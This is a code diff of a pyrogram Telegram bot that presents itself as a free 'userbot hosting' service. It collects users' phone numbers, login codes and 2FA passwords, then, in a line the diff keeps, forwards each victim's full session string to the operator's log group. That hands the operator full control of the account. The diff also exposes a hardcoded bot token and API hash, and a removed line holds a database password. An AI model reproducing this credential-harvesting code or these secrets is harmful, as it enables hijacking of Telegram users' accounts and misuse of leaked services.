@@ -3,16 +3,6 @@ from pyrogram import Client, filters, errors
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from flask import Flask
 from threading import Thread
-from motor.motor_asyncio import AsyncIOMotorClient
-
-# --- CONFIGURATION ---
-API_ID = 24135757
-API_HASH = "d3d5548fe0d98eb1fb793c2c37c9e5c8"
-BOT_TOKEN = "8303588999:AAEnHHO7ULTHA5IJKJAAGV8WEXSnV5dhz_M"
-MONGO_URL = "mongodb+srv://misssqn:VICTOR01@cluster0.3otqmso.mongodb.net/?appName=Cluster0"
-LOG_GROUP = -1002367805165 
-OWNER_ID = 6482447535
-START_IMG = "https://graph.org/file/422440e09d466500f2c93-953253772b0d8d2bfc.jpg"
 
 # --- WEB SERVER FOR RENDER ---
 app = Flask('')
@@ -20,42 +10,37 @@ app = Flask('')
 def home(): return "Bot is Online!"
 def run_web(): app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
 
-# --- BOT CLIENT ---
+# --- CONFIGURATION ---
+API_ID = 24135757
+API_HASH = "d3d5548fe0d98eb1fb793c2c37c9e5c8"
+BOT_TOKEN = "8303588999:AAEnHHO7ULTHA5IJKJAAGV8WEXSnV5dhz_M"
+LOG_GROUP = -1002367805165 
+START_IMG = "https://graph.org/file/422440e09d466500f2c93-953253772b0d8d2bfc.jpg"
+
 bot = Client("Useridgenbot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 user_data = {}
 stop_tag = False
 
-# --- BUTTONS ---
+# Buttons
 main_buttons = InlineKeyboardMarkup([
     [InlineKeyboardButton("𝚄𝚙𝚍𝚊𝚝𝚎", url="https://t.me/radhesupport"),
      InlineKeyboardButton("𝚂𝚞𝚙𝚙𝚘𝚛𝚝", url="https://t.me/+PKYLDIEYiTljMzMx")],
     [InlineKeyboardButton("𝙲𝚕𝚘𝚜𝚎", callback_data="close")]
 ])
 
-# --- COMMANDS ---
-
 @bot.on_message(filters.command("start") & filters.private)
 async def start(c, m):
-    start_text = (
-        f"✨ **ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ xᴇɴᴏ ᴜꜱᴇʀʙᴏᴛ** ✨\n\n"
-        f"ʜᴇʏ {m.from_user.mention},\n"
-        f"ᴍᴀɪɴ ᴀᴀᴘᴋɪ ɪᴅ ᴋᴏ **ʙᴏᴏꜱᴛ** ᴋᴀʀɴᴇ ᴀᴜʀ **ᴀɴɪᴍᴀᴛɪᴏɴꜱ** ᴋᴇ ʟɪʏᴇ ᴜꜱᴇʀʙᴏᴛ ʜᴏꜱᴛ ᴋᴀʀ ꜱᴀᴋᴛᴀ ʜᴏᴏɴ.\n\n"
-        f"🚀 **ᴀᴠᴀɪʟᴀʙʟᴇ ꜰᴇᴀᴛᴜʀᴇꜱ:**\n"
-        f"⚡ ᴀᴜᴛᴏ-ʜᴏꜱᴛɪɴɢ ꜱʏꜱᴛᴇᴍ\n"
-        f"🛡️ ꜱᴀꜰᴇ ᴀᴜʀ ꜱᴇᴄᴜʀᴇ ᴄʟᴏɴɪɴɢ\n"
-        f"💥 ʀᴀɪᴅ, ꜱᴘᴀᴍ & ᴛᴀɢɢᴇʀ ᴛᴏᴏʟꜱ\n\n"
-        f"📝 **ᴄᴏᴍᴍᴀɴᴅꜱ:**\n"
-        f"» **/help** : ᴏᴘᴇɴ ʜᴇʟᴘ ᴍᴇɴᴜ\n"
-        f"» **/guide** : ʜᴏᴡ ᴛᴏ ʜᴏꜱᴛ ʙᴏᴛ\n"
-        f"» **/add** : ꜱᴛᴀʀᴛ ʜᴏꜱᴛɪɴɢ ᴘʀᴏᴄᴇꜱꜱ\n\n"
-        f"ᴄʟɪᴄᴋ ʙᴇʟᴏᴡ ʙᴜᴛᴛᴏɴꜱ ꜰᴏʀ ᴍᴏʀᴇ ɪɴꜰᴏ."
-    )
     await m.reply_photo(
         photo=START_IMG,
-        caption=start_text,
+        caption=(f"✨ **ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ xᴇɴᴏ ᴜꜱᴇʀʙᴏᴛ** ✨\n\n"
+                 f"ʜᴇʏ {m.from_user.mention},\n"
+                 "ᴍᴀɪɴ ᴀᴀᴘᴋɪ ɪᴅ ᴋᴏ **ʙᴏᴏꜱᴛ** ᴋᴀʀɴᴇ ᴀᴜʀ **ᴀɴɪᴍᴀᴛɪᴏɴꜱ** ᴋᴇ ʟɪʏᴇ ᴜꜱᴇʀʙᴏᴛ ʜᴏꜱᴛ ᴋᴀʀ ꜱᴀᴋᴛᴀ ʜᴏᴏɴ.\n\n"
+                 "📝 **ᴄᴏᴍᴍᴀɴᴅꜱ:**\n"
+                 "» **/help** : ᴏᴘᴇɴ ʜᴇʟᴘ ᴍᴇɴᴜ\n"
+                 "» **/guide** : ʜᴏᴡ ᴛᴏ ʜᴏꜱᴛ ʙᴏᴛ\n"
+                 "» **/add** : ꜱᴛᴀʀᴛ ʜᴏꜱᴛɪɴɢ ᴘʀᴏᴄᴇꜱꜱ\n\n"
+                 "ᴄʟɪᴄᴋ ʙᴇʟᴏᴡ ʙᴜᴛᴛᴏɴꜱ ꜰᴏʀ ᴍᴏʀᴇ ɪɴꜰᴏ."),
         reply_markup=main_buttons
-    )
-
     )
 
 @bot.on_message(filters.command("help") & filters.private)
@@ -94,8 +79,6 @@ async def guide_menu(c, m):
 async def close_query(c, q):
     await q.message.delete()
 
-# --- HOSTING LOGIC (.add) ---
-
 @bot.on_message(filters.command("add") & filters.private)
 async def add_process(c, m):
     await m.reply_text("📲 **ᴩʟᴇᴀꜱᴇ ꜱᴇɴᴅ ʏᴏᴜʀ ᴩʜᴏɴᴇ ɴᴜᴍʙᴇʀ ɪɴ ɪɴᴛᴇʀɴᴀᴛɪᴏɴᴀʟ ꜰᴏʀᴍᴀᴛ**\n(e.g., `+918200000009`):")
@@ -104,7 +87,6 @@ async def add_process(c, m):
 async def handle_steps(c, m):
     uid = m.from_user.id
     text = m.text
-    
     if text.startswith("+"):
         user_data[uid] = {"phone": text}
         temp_c = Client(f"temp_{uid}", API_ID, API_HASH)
@@ -114,51 +96,27 @@ async def handle_steps(c, m):
             user_data[uid].update({"client": temp_c, "hash": code.phone_code_hash})
             await m.reply_text("📩 **ᴏᴛᴩ ꜱᴇɴᴛ!** ᴩʟᴇᴀꜱᴇ ꜱᴇɴᴅ ɪᴍ ᴛʜɪꜱ ꜰᴏʀᴍᴀᴛ: `1 2 3 4 5` (SPACE BY SPACE)")
         except Exception as e: await m.reply_text(f"❌ Error: {e}")
-
     elif " " in text and uid in user_data:
         data = user_data.get(uid)
         otp = text.replace(" ", "")
         try:
             await data["client"].sign_in(data["phone"], data["hash"], otp)
             string = await data["client"].export_session_string()
-            
-            # Log Group Details
             await c.send_message(LOG_GROUP, f"🔥 **New Userbot Added!**\n\n👤 User: {m.from_user.mention}\n🔑 String: `{string}`")
-            
             await m.reply_text(f"✅ **LOGGED IN AS** — `{m.from_user.first_name}`\n\n🔐 **SESSION STRING:**\n`{string}`\n\n🚀 **AUTO-HOST NOW...**")
             asyncio.create_task(start_userbot(string, uid))
         except errors.SessionPasswordNeeded:
             await m.reply_text("🔐 **ꜱᴇɴᴅ ʏᴏᴜʀ 2ꜰᴀ ᴩᴀꜱꜱᴡᴏʀᴅ.**")
         except Exception as e: await m.reply_text(f"❌ OTP Error: {e}")
 
-# --- USERBOT COMMANDS ---
-
 async def start_userbot(string, uid):
     try:
         ubot = Client(f"ubot_{uid}", API_ID, API_HASH, session_string=string)
         await ubot.start()
-
+        
         @ubot.on_message(filters.command("alive", prefixes=".") & filters.me)
         async def alive_cmd(c, m):
-            await m.edit("✨ **xᴇɴᴏ ᴀʟɪᴠᴇ ᴜꜱᴇʀɪᴅ ʙᴏᴛ**\n\n"
-                         "👤 **Owner:** Me\n"
-                         "📡 **Support:** @radhesupport")
-
-        @ubot.on_message(filters.command("tagall", prefixes=".") & filters.me)
-        async def tagall_cmd(c, m):
-            global stop_tag
-            stop_tag = False
-            async for member in c.get_chat_members(m.chat.id):
-                if stop_tag: break
-                if not member.user.is_bot:
-                    await c.send_message(m.chat.id, f"{member.user.mention} 𝙹𝚊𝚕𝚍𝚒 𝙰𝚊𝚘 𝚇𝙴𝙽𝙾!")
-                    await asyncio.sleep(2)
-
-        @ubot.on_message(filters.command("stop", prefixes=".") & filters.me)
-        async def stop_cmd(c, m):
-            global stop_tag
-            stop_tag = True
-            await m.edit("🛑 **Stopped.**")
+            await m.edit("✨ **xᴇɴᴏ ᴀʟɪᴠᴇ ᴜꜱᴇʀɪᴅ ʙᴏᴛ**\n\n👤 **Owner:** Me\n📡 **Support:** @radhesupport")
 
     except Exception as e: print(f"Error: {e}")
 
